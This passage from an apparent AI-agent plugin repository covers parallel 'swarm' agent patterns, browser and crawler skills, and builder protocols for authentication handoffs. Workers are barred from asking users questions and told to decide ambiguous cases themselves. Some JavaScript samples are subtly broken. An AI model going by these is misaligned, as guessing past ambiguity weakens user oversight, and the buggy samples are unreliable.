2 (records 10K-20K)\n   ...\n   Chunk 100: Agent 100 (records 990K-1M)\n   Aggregate (combined dataset)\n```\n\n### Use Case 4: Brainstorming\n\n**Task:** \"Generate 100 product feature ideas\"\n\n**Swarm:** 20 ideation agents\n**Benefit:** Diverse creativity, volume\n\n**Execution:**\n```\nIdeation Task\n   Ideator Agent 1 (10 ideas)\n   Ideator Agent 2 (10 ideas)\n   ...\n   Ideator Agent 20 (10 ideas)\n   Aggregate (100 unique ideas)\n   Deduplicate\n   Score and rank\n```\n\n## Benefits\n\n**High Parallelism**\n- Execute multiple tasks simultaneously\n- Maximize computational resources\n- Significantly faster completion\n\n**Scalable Execution**\n- Easy to add more agents\n- Linear speedup potential\n- Handle increasing workload\n\n**Multiple Perspectives**\n- Different agents, different views\n- Catch diverse issues\n- Comprehensive coverage\n\n**Fault Tolerance**\n- Redundancy built-in\n- Agent failures don't stop task\n- Majority voting for reliability\n\n**Diversity of Solutions**\n- Multiple approaches to problem\n- Creative combinations\n- Better overall solutions\n\n## Limitations\n\n**Result Coordination Complexity**\n- Merging results can be difficult\n- Conflict resolution needed\n- Inconsistency management\n\n**Potential Redundant Work**\n- Multiple agents may do same work\n- Resource inefficiency\n- Coordination overhead\n\n**Resource Intensive**\n- Requires multiple agents\n- Higher computational cost\n- Memory overhead\n\n**Result Merging Overhead**\n- Time to combine results\n- Quality assessment needed\n- May lose nuance\n\n**Quality Variance**\n- Agents may produce different quality\n- Need quality assessment\n- Risk of averaging down quality\n\n## Best Practices\n\n### 1. Appropriate Task Division\n\n**Do:**\n- Divide into independent chunks\n- Ensure tasks can run in parallel\n- Balance workload across agents\n- Minimize inter-agent dependencies\n\n**Example:**\n```javascript\n// Good: Independent chunks\nconst chunks = data.map((item, index) => ({\n  id: index,\n  data: item,\n  task: 'process'\n}))\n\n// Avoid: Dependent tasks\nconst tasks = [\n  { task: 'analyze', dependsOn: null },\n  { task: 'validate', dependsOn: 'analyze' },\n  { task: 'report', dependsOn: 'validate' }\n]\n```\n\n### 2. Result Quality Assessment\n\n**Do:**\n- Implement quality metrics\n- Weight results appropriately\n- Handle outliers\n- Validate final output\n\n**Example:**\n```javascript\naggregateResults(results) {\n  const validResults = results.filter(r => r.success)\n\n  // Weight by quality score\n  const weightedResults = validResults.map(r => ({\n    ...r,\n    weight: r.qualityScore\n  }))\n\n  // Calculate weighted average\n  return this.weightedCombine(weightedResults)\n}\n```\n\n### 3. Conflict Resolution\n\n**Do:**\n- Define conflict resolution strategy\n- Use voting mechanisms\n- Delegate to tie-breaker\n- Document resolution logic\n\n**Example:**\n```javascript\nresolveConflict(results) {\n  const options = results.map(r => r.output)\n\n  // Strategy 1: Majority vote\n  const vote = this.countVotes(options)\n  if (vote.majority > options.length / 2) {\n    return vote.majorityChoice\n  }\n\n  // Strategy 2: Tie-breaker agent\n  return this.tieBreaker(results)\n}\n```\n\n### 4. Efficient Communication\n\n**Do:**\n- Minimize inter-agent communication\n- Use structured messages\n- Avoid chatty protocols\n- Batch communications\n\n**Example:**\n```javascript\n// Good: Minimal communication\nclass Agent {\n  async execute(task) {\n    return {\n      result: await this.process(task.data),\n      metadata: { quality: 0.95 }\n    }\n  }\n}\n\n// Avoid: Excessive communication\nclass Agent {\n  async execute(task) {\n    await this.send('starting', task)\n    const result = await this.process(task.data)\n    await this.send('progress', 50)\n    await this.send('progress', 75)\n    await this.send('complete', result)\n  }\n}\n```\n\n### 5. Resource Management\n\n**Do:**\n- Limit concurrent agents\n- Monitor resource usage\n- Implement backpressure\n- Handle agent failures\n\n**Example:**\n```javascript\nclass ResourceAwareSwarm extends Swarm {\n  async execute(task, maxAgents = 10) {\n    const availableAgents = this.getAvailableAgents()\n\n    // Don't exceed resource limits\n    const agentCount = Math.min(maxAgents, availableAgents)\n\n    return super.execute(task, agentCount)\n  }\n\n  getAvailableAgents() {\n    const cpuUsage = process.cpuUsage()\n    const memoryUsage = process.memoryUsage()\n\n    if (cpuUsage > 0.8 || memoryUsage > 0.8) {\n      return Math.floor(maxAgents / 2)\n    }\n\n    return maxAgents\n  }\n}\n```\n\n## Anti-Patterns to Avoid\n\n### Anti-Pattern 1: Sequential Swarms\n\n**Problem:** Using swarm for sequential tasks\n```javascript\n// Bad: Sequential dependencies\nconst result1 = await agent1.execute(task1)\nconst result2 = await agent2.execute(result1) // Waits for result1\nconst result3 = await agent3.execute(result2) // Waits for result2\n```\n\n**Solution:** Use orchestrator for sequential tasks\n```javascript\n// Good: Parallel independent tasks\nconst [result1, result2, result3] = await Promise.all([\n  agent1.execute(task1),\n  agent2.execute(task2),\n  agent3.execute(task3)\n])\n```\n\n### Anti-Pattern 2: No Result Aggregation\n\n**Problem:** Not combining results properly\n```javascript\n// Bad: Return first result\nasync execute(task, agents) {\n  const results = await Promise.all(\n    agents.map(agent => agent.execute(task))\n  )\n  return results[0] // Ignore other results!\n}\n```\n\n**Solution:** Aggregate properly\n```javascript\n// Good: Aggregate all results\nasync execute(task, agents) {\n  const results = await Promise.all(\n    agents.map(agent => agent.execute(task))\n  )\n  return this.aggregateResults(results)\n}\n```\n\n### Anti-Pattern 3: Homogeneous Agents\n\n**Problem:** All agents identical with same bias\n```javascript\n// Bad: All analytical agents\nconst agents = Array(10).fill(() => new AnalyticalAgent())\n```\n\n**Solution:** Diverse agent types\n```javascript\n// Good: Diverse perspectives\nconst agents = [\n  ...Array(3).fill(() => new AnalyticalAgent()),\n  ...Array(3).fill(() => new CreativeAgent()),\n  ...Array(2).fill(() => new TechnicalAgent()),\n  ...Array(2).fill(() => new BusinessAgent())\n]\n```\n\n## Advanced Patterns\n\n### Adaptive Swarm\n\n```javascript\nclass AdaptiveSwarm extends Swarm {\n  async execute(task) {\n    const initialResults = await this.executeSwarm(task, 5)\n\n    // If quality is low, add more agents\n    if (this.calculateQuality(initialResults) < 0.8) {\n      const additionalResults = await this.executeSwarm(task, 5)\n      return this.aggregateResults([...initialResults, ...additionalResults])\n    }\n\n    return this.aggregateResults(initialResults)\n  }\n}\n```\n\n### Hierarchical Swarm\n\n```javascript\nclass HierarchicalSwarm extends Swarm {\n  async execute(task, depth = 2) {\n    if (depth === 0) {\n      return new Agent().execute(task)\n    }\n\n    // Create sub-swarms\n    const subSwarms = await Promise.all(\n      Array(3).fill(0).map(() => this.executeSwarm(task, 5))\n    )\n\n    // Combine sub-swarm results\n    return this.aggregateResults(subSwarms.flat())\n  }\n}\n```\n\n## Monitoring and Metrics\n\n### Key Metrics\n\n**Performance:**\n- **Parallel efficiency** = (single_agent_time / (multi_agent_time / num_agents)) * 100\n- **Speedup factor** = single_agent_time / multi_agent_time\n- **Resource utilization**\n- **Queue wait time**\n\n**Quality:**\n- **Result consistency**\n- **Quality variance**\n- **Consensus strength**\n- **Outlier detection**\n\n### Example Monitoring\n\n```javascript\nclass SwarmMonitor {\n  trackExecution(task, results) {\n    return {\n      task: task.id,\n      agentCount: results.length,\n      parallelEfficiency: this.calculateEfficiency(results),\n      qualityScore: this.calculateQuality(results),\n      consistencyScore: this.calculateConsistency(results),\n      conflicts: this.detectConflicts(results)\n    }\n  }\n}\n```\n\n## Conclusion\n\nThe Swarm Pattern excels when you need:\n- Parallel execution\n- Multiple perspectives\n- Fault tolerance\n- High throughput\n\nRemember:\n- Ensure tasks are independent\n- Implement proper aggregation\n- Balance resource usage\n- Monitor quality and consistency\n\nFor sequential or dependent tasks, use the Orchestrator Pattern instead.\n",
        "plugins/sys-browser/.claude-plugin/plugin.json": "{\n  \"name\": \"sys-browser\",\n  \"version\": \"2.0.0\",\n  \"description\": \"The complete web interaction suite. Features 'browsing-web' for interactive automation (agent-browser) and 'crawling-content' for high-speed extraction (@just-every/crawl).\",\n  \"license\": \"Apache-2.0\",\n  \"author\": {\n    \"name\": \"Git-Fg\"\n  },\n  \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n  \"homepage\": \"https://github.com/Git-Fg/thecattoolkit/tree/main/plugins/sys-browser\",\n  \"keywords\": [\n    \"mcp\",\n    \"playwright\",\n    \"crawler\",\n    \"scraping\",\n    \"automation\",\n    \"testing\"\n  ]\n}",
        "plugins/sys-browser/commands/browse.md": "---\ndescription: \"Launch interactive browser session. Use for complex tasks.\"\nargument-hint: \"<url> [objective]\"\nallowed-tools: [Skill(browsing-web)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(browsing-web)` to navigate to \"$1\" and execute: \"${2:-explore}\".\n",
        "plugins/sys-browser/commands/crawl.md": "---\ndescription: \"Advanced crawling with configuration options (depth, format, etc).\"\nargument-hint: \"<url> [options]\"\nallowed-tools: [Skill(crawling-content)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(crawling-content)` to crawl \"$1\" with options: \"${@:2}\".\n",
        "plugins/sys-browser/commands/read.md": "---\ndescription: \"Instant read-only fetch of a URL. Uses fast crawler.\"\nargument-hint: \"<url>\"\nallowed-tools: [Skill(crawling-content)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(crawling-content)` to fetch \"$1\".\n",
        "plugins/sys-browser/commands/save.md": "---\ndescription: \"Downloads a web page and saves it as a clean Markdown file.\"\nargument-hint: \"<url> <path>\"\nallowed-tools: [Skill(crawling-content), Write]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(crawling-content)` to fetch \"$1\", then save the output to \"$2\".\n",
        "plugins/sys-browser/commands/spider.md": "---\ndescription: \"Deep crawl (depth=20) to map a documentation site structure.\"\nargument-hint: \"<url>\"\nallowed-tools: [Skill(crawling-content)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(crawling-content)` to spider \"$1\" with `--pages 20 --output json`.\n",
        "plugins/sys-browser/skills/browsing-web/SKILL.md": "---\nname: browsing-web\ndescription: \"Interactive browser automation using agent-browser. Use when navigating dynamic sites, authentication, clicking, typing, and complex state navigation. Do NOT use for simple read-only text extraction.\"\nallowed-tools: [Bash]\n---\n\n# Browser Interaction Protocol\n\n## Core Loop (The Ref Pattern)\nYou interact with the browser using **References (@refs)** derived from snapshots, not CSS selectors.\n\n1.  **Navigate**: `agent-browser open \"url\"`\n2.  **Snapshot**: `agent-browser snapshot -i` (Gets accessibility tree with `@e` refs)\n3.  **Interact**: `agent-browser click @e1` (Uses ref from snapshot)\n\n## Critical Constraints\n1.  **Never Guess Selectors**: You cannot guess `@e1`. You MUST run `snapshot` to see current refs.\n2.  **Interactive Only**: Always use `snapshot -i` to filter non-interactive elements (saves tokens).\n3.  **Stateful**: The browser persists between commands. You do not need to re-open.\n\n## Common Patterns\n\n### Navigation & extraction\n```bash\nagent-browser open \"https://google.com\"\nagent-browser snapshot -i\n# Output shows: [ref=e4] button \"Search\"\nagent-browser fill @e2 \"Claude Code\"\nagent-browser click @e4\nagent-browser wait --load networkidle\n```\n\n### Visual Verification\nOnly if structure is confusing:\n```bash\nagent-browser screenshot page.png\n```\n",
        "plugins/sys-browser/skills/crawling-content/SKILL.md": "---\nname: crawling-content\ndescription: \"High-speed read-only web extraction. Use when fetching documentation, blogs, and static pages. Do not use for apps requiring login or interaction.\"\nallowed-tools: [Bash]\n---\n\n# Content Crawler Protocol\n\n## Usage\nUse `@just-every/crawl` for zero-latency markdown extraction.\n\n### Single Page (Read)\n```bash\nnpx -y @just-every/crawl \"https://example.com\"\n```\n\n### Site Map (Spider)\n```bash\nnpx -y @just-every/crawl \"https://example.com\" --pages 20 --output json\n```\n\n## Failure Mode\nIf output contains \"JavaScript required\" or \"Access Denied\", **STOP**. Switch to `Skill(browsing-web)` to handle the dynamic rendering.\n",
        "plugins/sys-browser/skills/testing-e2e/SKILL.md": "---\nname: testing-e2e\ndescription: \"Orchestrates end-to-end testing workflows coordinating browser automation with server verification. Use when validating complete user flows, testing multi-step scenarios, or verifying browser-server integration. Do not use for unit testing, API testing, isolated component testing, or documentation code examples  see generating-tests skill.\"\ncontext: fork  # Required: Coordinates browser automation with server-side verification, orchestrates complete test workflows\nuser-invocable: false\nallowed-tools: [Read, Write, Edit, Glob, Grep, Bash, Task]\n---\n\n# End-to-End Testing Orchestration\n\n\n\n## Test Workflow\n\n### 1. Test Planning\n- Identify user flows to validate\n- Define success criteria\n- Map test scenarios to requirements\n\n### 2. Environment Setup\n- Start server (if needed)\n- Configure browser automation\n- Prepare test data\n\n### 3. Test Execution\n- Run browser automation steps\n- Verify server responses\n- Capture screenshots/logs on failure\n\n### 4. Results Analysis\n- Compare actual vs expected outcomes\n- Generate test reports\n- Identify failures and root causes\n\n\n\n## Orchestration Pattern\n\n1. **Coordinate**: Start server, launch browser\n2. **Execute**: Run test steps in sequence\n3. **Verify**: Check server state, browser output\n4. **Report**: Consolidate results and findings\n\n## Reference Materials\n\nTest patterns and verification strategies are documented inline above.\n\n**Note**: For isolated browser automation, use `driving-browser` skill. For server-only testing, use appropriate backend testing tools.\n",
        "plugins/sys-builder/.claude-plugin/plugin.json": "{\n    \"name\": \"sys-builder\",\n    \"description\": \"DEVELOPMENT & ENGINEERING DOMAIN - Software development, architecture design, planning, execution, testing, and project implementation\",\n    \"version\": \"1.0.1\",\n    \"license\": \"MIT\",\n    \"author\": {\n        \"name\": \"Git-Fg\"\n    },\n    \"keywords\": [\n        \"development\",\n        \"engineering\",\n        \"architecture\",\n        \"planning\",\n        \"execution\",\n        \"software-engineering\",\n        \"testing\",\n        \"implementation\"\n    ]\n}\n",
        "plugins/sys-builder/README.md": "# execute\n\n**Act Phase** - Where file modifications and irreversible actions happen.\n\n## Purpose\n\nThe execution engine for the Cat Toolkit. Transforms plans into reality through orchestrated implementation.\n\n## Agents\n\n- **worker** - Universal builder for autonomous implementation (TDD, debugging)\n- **architect** - System architecture and design specialist\n\n## Skills\n\n- **execution-core** - Universal behavioral standards (Uninterrupted Flow, Self-Verification, Handoffs)\n- **builder-core** - Document templates (BRIEF.md, ROADMAP.md, PLAN.md) and orchestration standards\n- **software-engineering** - Engineering protocols (TDD, Debugging, Code Review, Security)\n- **architecture** - System design frameworks and ADR documentation\n\n## Commands\n\n- `/plan` - Intelligently routes between autonomous and interactive planning workflows\n- `/create-plan` - Autonomous plan creation with codebase investigation\n- `/create-plan-interactive` - Interactive planning with deep requirements gathering\n- `/run-plan` - Execute project phases via worker agent\n- `/manage-plan` - Modify existing plans and update task status\n\n## Usage\n\nThe `/plan` command intelligently routes planning workflows based on complexity. Use `/run-plan` to execute phases via the worker agent. All agents operate in Uninterrupted Flow with self-verification.\n",
        "plugins/sys-builder/agents/executor.md": "---\nname: executor\ndescription: \"Non-interactive implementation runtime. Executes plans without user interrupts.\"\ntools: [Read, Write, Edit, Bash, Glob, Grep]\nskills: [managing-plans, applying-code-standards, adhering-execution-standard]\n\n---\n# Executor Configuration\nNon-interactive runtime for task execution.\n",
        "plugins/sys-builder/commands/code-review.md": "---\ndescription: \"Quick access to code review and static analysis capabilities. Runs automated checks including linting, type checking, and security scanning.\"\nargument-hint: \"[mode] [target]\"\nallowed-tools: [Skill(applying-code-standards)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(applying-code-standards)` in **Code Review** or **Static Analysis** mode with inputs: \"$ARGUMENTS\".\n",
        "plugins/sys-builder/commands/manage-plan.md": "---\ndescription: \"Update or modify existing plans.\"\nargument-hint: \"<status update or change request>\"\nallowed-tools: [Skill(managing-plans)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(managing-plans)` with intent \"Modify Plan\" and input: \"$ARGUMENTS\".\n",
        "plugins/sys-builder/commands/plan.md": "---\ndescription: \"Intelligently architect project plans. Auto-detects complexity.\"\nargument-hint: \"<project description> [--interactive] [--force-autonomous]\"\nallowed-tools: [Skill(managing-plans)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(managing-plans)` with intent \"Create Plan\" and input: \"$ARGUMENTS\".\n",
        "plugins/sys-builder/commands/run-plan.md": "---\ndescription: \"Execute the next pending phase in the roadmap.\"\nargument-hint: \"[optional: phase number]\"\nallowed-tools: [Skill(managing-plans)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(managing-plans)` with intent \"Execute Phase\" and input: \"$ARGUMENTS\".\n",
        "plugins/sys-builder/skills/adhering-execution-standard/SKILL.md": "---\nname: adhering-execution-standard\ndescription: \"Defines behavioral standards for autonomous agents and enforces Uninterrupted Flow, Self-Verification, Auth-Gates, and Handoff protocols. PROACTIVELY Use when defining behavioral standards for autonomous agents or enforcing protocols. Internal-only reference for agent behavior.\"\nuser-invocable: false\nallowed-tools: Bash, Edit, Read, Write, Glob, Grep\n---\n\n# Execution Core Standards\n\n**Behavioral Protocols:**\n- `references/observation-points.md` - Self-verification and evidence collection\n- `references/auth-gates.md` - Authentication error handling\n- `references/handoff-protocol.md` - Standard handoff format\n- `references/execution-protocol.md` - Universal worker execution steps\n\n## Core Behavioral Standards\n\n### 1. Uninterrupted Flow\n**Protocol:** `references/observation-points.md`\n\n- Agents execute tasks sequentially\n- Verify success programmatically via CLI\n- Log results in structured format\n- Continue to next task without waiting\n\n### 2. Self-Verification\n**Standard Pattern:**\n```markdown\n**Self-Verification Results:**\n [Verification 1 passed]\n [Verification 2 passed]\n\nNext: Continue to next task\n```\n\n### 3. Authentication Gates\n**Protocol:** `references/auth-gates.md`\n\n1. **Recognize** auth gate (401, 403, \"not authenticated\")\n2. **STOP** execution (don't retry in loop)\n3. **Create** HANDOFF.md with exact steps\n4. **EXIT** process\n5. **Resume** after human provides credentials\n\n### 4. Handoff Protocol\n\nStandard format for pausing execution.\n\n**Protocol:** `references/handoff-protocol.md`\n\nUse for:\n- Authentication gates\n- Critical failures\n- Ambiguous requirements\n- Missing dependencies\n\n**Format:**\n```markdown\n# HANDOFF Required\n\n**Reason**: [AUTH_GATE | CONFLICT | AMBIGUOUS]\n\n**What Happened**: [Description]\n\n**What You Need to Do**: [Specific action]\n\n**Verification**: [How to confirm fix]\n\n**Next Step**: Restart execution after [action]\n```\n\n## Usage in Other Skills\n\nSkills reference execution-core for behavioral standards:\n\n**Example from builder-core:**\n```\nUse execution-core observation-points for self-verification\nUse execution-core auth-gates for authentication handling\n```\n\n**Example from software-engineering:**\n```\nApply execution-core verification protocols during TDD\nUse execution-core handoff format for blockers\n```\n\n\n\n## 5. Human Interaction Policy (AskUserQuestion)\n\nTo ensure Uninterrupted Flow, the following policy applies to human interaction:\n\n- **Execution Phase Workers (e.g., Worker Agent):** `AskUserQuestion` is **STRICTLY PROHIBITED**. Workers must operate autonomously or use the Handoff Protocol if blocked.\n- **Planning Phase Coordinators (e.g., Director, Orchestrator):** `AskUserQuestion` is **ALLOWED** for requirements gathering and clarification before execution begins.\n\nThis policy ensures that heavy implementation tasks are never interrupted, while initial discovery remains interactive.\n\n\n",
        "plugins/sys-builder/skills/adhering-execution-standard/references/auth-gates.md": "# Authentication Gates\n\n## Handling Authentication Errors During Execution\n\n**When you encounter authentication errors during auto task execution:**\n\nThis is NOT a failure. Authentication gates are expected and normal. Handle them using the **Exit and Handoff** pattern.\n\n## Authentication Error Indicators\n\n- CLI returns: \"Error: Not authenticated\", \"Not logged in\", \"Unauthorized\", \"401\", \"403\"\n- API returns: \"Authentication required\", \"Invalid API key\", \"Missing credentials\"\n- Command fails with: \"Please run {tool} login\" or \"Set {ENV_VAR} environment variable\"\n\n## Exit and Handoff Protocol\n\n**CRITICAL:** Do NOT wait in a loop for user authentication. Instead:\n\n1. **Recognize it's an auth gate** - Not a bug, just needs credentials\n2. **STOP current task execution** - Don't retry repeatedly\n3. **Create HANDOFF.md** - Document exact command needed from human\n4. **EXIT process** - Terminate, don't wait in loop\n5. **Human provides credentials** - Separate interaction\n6. **Agent resumes** - On restart, continues from handoff point\n\n## Example: Vercel Deployment\n\n```\nTask 3: Deploy to Vercel\nRunning: vercel --yes\n\nError: Not authenticated. Please run 'vercel login'\n\n[Create HANDOFF.md and exit]\n\n# HANDOFF Required\n\n**Reason**: AUTH_GATE\n\n**What Happened**:\nI attempted to deploy to Vercel but encountered an authentication error.\n\n**What You Need to Do**:\nRun: `vercel login`\n\nThis will open your browser - complete the authentication flow.\n\n**Verification**:\nAfter completing authentication, run: `vercel whoami`\nThis should return your account email.\n\n**Next Step**:\nRestart execution after running `vercel login`. I will verify authentication and continue deployment.\n```\n\n**Human runs:** `vercel login` (in separate terminal/session)\n\n**Agent resumes:** On restart, agent checks `vercel whoami` and continues deployment\n\n## Example: Stripe API\n\n```\nTask 5: Create Stripe webhook endpoint\nUsing Stripe API...\n\nError: 401 Unauthorized - No API key provided\n\n[Create HANDOFF.md and exit]\n\n# HANDOFF Required\n\n**Reason**: AUTH_GATE\n\n**What Happened**:\nI attempted to create a Stripe webhook endpoint but need your Stripe API key.\n\n**What You Need to Do**:\n1. Visit dashboard.stripe.com/apikeys\n2. Copy your \"Secret key\" (starts with sk_test_ or sk_live_)\n3. Set environment variable: `export STRIPE_SECRET_KEY=sk_test_...`\n\n**Verification**:\nAfter setting the key, I will verify Stripe API access with a test call.\n\n**Next Step**:\nRestart execution after providing the API key. I will verify it works and create the webhook endpoint.\n```\n\n**Human sets:** `export STRIPE_SECRET_KEY=sk_test_...`\n\n**Agent resumes:** On restart, agent verifies key and creates webhook\n\n## HANDOFF.md Template\n\n```markdown\n# HANDOFF Required\n\n**Reason**: [AUTH_GATE | CONFLICT | AMBIGUOUS]\n\n**What Happened**:\n[Description of what you were trying to do]\n\n**What You Need to Do**:\n[Specific steps to resolve the issue]\n\n**Verification**:\n[How to confirm the issue is resolved]\n\n**Next Step**:\nRestart execution after [providing credentials | installing dependency | clarifying requirements]. I will verify the fix and continue execution.\n```\n\n## Error Types and Handling\n\n### AUTH_GATE\n\n**Trigger:** Authentication/authorization required\n\n**Action:** Create HANDOFF.md with credential requirements\n\n**Example:**\n```markdown\n**Reason**: AUTH_GATE\n\n**What You Need to Do**:\nSet environment variable: `export GITHUB_TOKEN=ghp_...`\n\n**Verification**:\nI will verify with: `gh api user`\n```\n\n### AMBIGUOUS\n\n**Trigger:** Task requirements unclear or contradictory\n\n**Action:** Create HANDOFF.md requesting clarification\n\n**Example:**\n```markdown\n**Reason**: AMBIGUOUS\n\n**What Happened**:\nTask requirements are unclear - conflicting specifications for API endpoint.\n\n**What You Need to Do**:\nClarify which specification should be implemented:\n- Option A: REST-style endpoints\n- Option B: GraphQL endpoints\n\n**Next Step**:\nRestart execution after clarification. I will implement according to your choice.\n```\n\n### CONFLICT\n\n**Trigger:** Version control conflicts (git) or resource conflicts\n\n**Action:** Create HANDOFF.md with resolution instructions\n\n**Example:**\n```markdown\n**Reason**: CONFLICT\n\n**What Happened**:\nGit push rejected due to remote changes\n\n**What You Need to Do**:\nResolve merge conflicts:\n1. Run `git pull` to get latest changes\n2. Resolve conflicts in files\n3. Run `git add` and `git commit`\n\n**Next Step**:\nRestart execution after resolving conflicts. I will verify and continue.\n```\n\n## Documentation in Summary\n\nDocument authentication gates as normal flow, not deviations:\n\n```markdown\n## Authentication Gates\n\nDuring execution, I encountered authentication requirements:\n\n1. Task 3: Vercel CLI required authentication\n   - Created HANDOFF.md with login instructions\n   - Resumed after user ran `vercel login`\n   - Deployed successfully\n\n2. Task 5: Stripe API required API key\n   - Created HANDOFF.md with key setup instructions\n   - Resumed after user exported STRIPE_SECRET_KEY\n   - Created webhook successfully\n\nThese are normal gates, not errors.\n```\n\n## Key Principles\n\n- Authentication gates are NOT failures or bugs\n- They're expected interaction points during first-time setup\n- Handle them with **Exit and Handoff** pattern\n- Create HANDOFF.md with clear instructions\n- **NEVER wait in a loop** for user input\n- Document them as normal flow, separate from deviations\n- On restart, agents verify the fix and continue execution\n\n## Differences: Old vs New\n\n###  OLD: Wait and Loop\n```markdown\n[Error occurs]\n\nCHECKPOINT: Authentication Required\nPlease run: vercel login\nType \"done\" when authenticated\n\n[Agent waits in loop]\n```\n\n###  NEW: Exit and Handoff\n```markdown\n[Error occurs]\n\nHANDOFF.md Created:\n- Reason: AUTH_GATE\n- Action: Run `vercel login`\n- Next: Restart after authentication\n\n[Agent exits]\n```\n\n**Benefit:** No token waste on waiting. Human handles auth separately.\n\nSee references/observation-points.md for more on Uninterrupted Flow architecture.\n",
        "plugins/sys-builder/skills/adhering-execution-standard/references/execution-protocol.md": "# Builder Worker Protocol\n\n## 1. Universal Execution Protocol\n\nWhen activated, you will receive a natural language assignment structured with Markdown headers: `# Context` and `# Assignment`.\n\n**CRITICAL: NO FILE REFERENCES**\nAll necessary context is provided directly in the `# Context` section. Do NOT attempt to read ROADMAP.md, or any plan files.\n\n## 2. Context Analysis\n\n**MANDATORY:** Read the `# Context` section completely to understand:\n- What project you're working in\n- What phase or task this is\n- What context files were injected\n- Any constraints or dependencies\n\n**DO NOT** use AskUserQuestion. If context is unclear, make the best decision based on available information or create HANDOFF.md per execution-core.\n\n## 3. Apply Engineering Protocol\n\n**Determine the appropriate engineering approach:**\n\n### For Debugging Tasks:\n1. Apply the 6-phase debugging protocol\n2. Apply security checklist (scanning for secrets and vulnerabilities)\n3. Follow the scientific method: Capture  Analyze  Hypothesize  Test  Fix  Verify\n\n### For TDD Tasks:\n1. Follow Red-Green-Refactor cycle\n2. Apply TDD methodology details\n3. Cycle: Write failing test  Write minimal code  Refactor\n\n### For Implementation Tasks:\n1. Read relevant reference documentation\n2. Apply appropriate engineering patterns\n3. Use tests to verify functionality\n\n### For Code Review Tasks:\n1. Follow code review workflow\n2. Apply security checklist\n3. Focus on correctness, security, and maintainability\n\n## 4. Execute in Uninterrupted Flow\n\n**MANDATORY EXECUTION PROTOCOL:**\n\n1. **Execute** the task as described\n2. **Verify** your work using Self-Verification Points (execution-core/references/observation-points.md)\n3. **Log** verification results in structured format\n4. **Continue** to next step without waiting for human input\n\n**Self-Verification Pattern:**\n```markdown\n**Self-Verification Results:**\n [Verification 1 passed]\n [Verification 2 passed]\n\nNext: Continue to next task\n```\n\n**IF AUTHENTICATION ERRORS OCCUR:**\n- Recognize it's an auth gate (execution-core/references/auth-gates.md)\n- Create HANDOFF.md with exact steps needed\n- EXIT process (don't wait in loop)\n\n**IF UNRECOVERABLE BLOCKERS OCCUR:**\n- Create HANDOFF.md per execution-core/references/handoff-protocol.md\n- Document attempted solutions\n- EXIT process\n\n## 5. Document Results\n\n**Update PROJECT STATE as needed:**\n\n### After Plan Execution:\n- Read phase plan file to understand current status\n- Update phase plan file status: `status: complete`\n- Create SUMMARY.md using `builder-core/references/templates/summary.md`\n- Update ROADMAP.md progress table if applicable\n\n### After Engineering Tasks:\n- Create or update relevant documentation\n- Log verification evidence\n- Document any deviations from original plan\n\n## 6. Report Completion\n\n**Use structured format:**\n\n```markdown\n[WORKER] Task completed successfully\n\n**What was done:**\n- [Accomplishment 1]\n- [Accomplishment 2]\n\n**Files modified:**\n- `path/to/file1` - [Brief change description]\n- `path/to/file2` - [Brief change description]\n\n**Verification evidence:**\n- [Evidence 1]\n- [Evidence 2]\n\n**Next steps:**\n- [If any follow-up needed]\n```\n\n## 7. Handle Errors\n\n**Recoverable Errors:**\n- Attempt auto-healing (max 3 attempts)\n- Use engineering protocols to diagnose\n- Apply fixes based on systematic analysis\n\n**Unrecoverable Errors:**\n- Create HANDOFF.md per execution-core standards\n- Include: Reason, What Happened, What You Need to Do, Verification, Next Step\n- EXIT process\n\n**Ambiguous Situations:**\n- Make best decision based on available context\n- Document decision rationale\n- Continue execution\n",
        "plugins/sys-builder/skills/adhering-execution-standard/references/handoff-protocol.md": "# Handoff Protocol\n\n## Purpose\n\nStandard format for pausing execution when encountering blockers. Ensures consistent handoffs across all builder operations.\n\n## When to Use Handoff\n\nCreate HANDOFF.md when:\n\n- **Authentication Gates:** Credentials required (401/403 errors)\n- **Critical Failures:** Unrecoverable errors\n- **Ambiguous Requirements:** Task unclear or contradictory\n- **Missing Dependencies:** Installation or setup required\n\n## Standard Handoff Format\n\n```markdown\n# HANDOFF Required\n\n**Reason**: [AUTH_GATE | CONFLICT | AMBIGUOUS | DEPENDENCY]\n\n**What Happened**:\n[Clear description of the issue or requirement]\n\n**What You Need to Do**:\n[Specific steps to resolve - commands, clicks, configuration]\n\n**Verification**:\n[How to confirm the issue is resolved]\n\n**Next Step**:\nRestart execution after [providing credentials | clarifying | installing]. I will verify the fix and continue execution.\n\n**Context**:\n- Phase: [current phase name]\n- Task: [task that was blocked]\n- Attempted: [what you tried]\n```\n\n## Reason Categories\n\n### AUTH_GATE\n\n**Trigger:** Authentication/authorization required\n\n**Example:**\n```markdown\n**Reason**: AUTH_GATE\n\n**What Happened**:\nAttempted to deploy to Vercel but need authentication\n\n**What You Need to Do**:\nRun: `vercel login`\n\n**Verification**:\nRun: `vercel whoami` - should return your email\n\n**Next Step**:\nRestart execution after authentication\n```\n\n### CONFLICT\n\n**Trigger:** Version control conflicts or resource conflicts\n\n**Example:**\n```markdown\n**Reason**: CONFLICT\n\n**What Happened**:\nGit push rejected - remote has changes\n\n**What You Need to Do**:\n1. Run `git pull`\n2. Resolve merge conflicts in files\n3. Run `git add` and `git commit`\n\n**Next Step**:\nRestart execution after resolving conflicts\n```\n\n### AMBIGUOUS\n\n**Trigger:** Task requirements unclear or contradictory\n\n**Example:**\n```markdown\n**Reason**: AMBIGUOUS\n\n**What Happened**:\nTask specifies both REST and GraphQL APIs - unclear which to implement\n\n**What You Need to Do**:\nChoose implementation approach:\n- REST: Traditional RESTful endpoints\n- GraphQL: Single endpoint with queries/mutations\n\n**Next Step**:\nRestart execution after clarification\n```\n\n### DEPENDENCY\n\n**Trigger:** Missing tools, packages, or system dependencies\n\n**Example:**\n```markdown\n**Reason**: DEPENDENCY\n\n**What Happened**:\nCannot run tests - pytest not installed\n\n**What You Need to Do**:\nInstall pytest: `pip install pytest`\n\n**Verification**:\nRun: `pytest --version` - should show version\n\n**Next Step**:\nRestart execution after installation\n```\n\n## File Location\n\nSave HANDOFF.md in the current 